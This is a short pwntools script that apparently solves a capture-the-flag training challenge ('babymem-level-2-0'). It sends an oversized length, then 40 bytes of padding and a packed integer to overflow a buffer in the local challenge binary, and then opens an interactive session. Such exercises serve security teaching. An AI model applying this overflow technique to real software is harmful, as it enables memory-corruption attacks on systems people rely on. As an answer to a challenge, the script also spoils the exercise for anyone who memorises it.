from pwn import *

elf = ELF("/challenge/babymem-level-2-0")
p = elf.process()

p.sendline(b"5000")

payload = b"A"*40 + p64(3765354)

p.sendline(payload)

p.interactive()
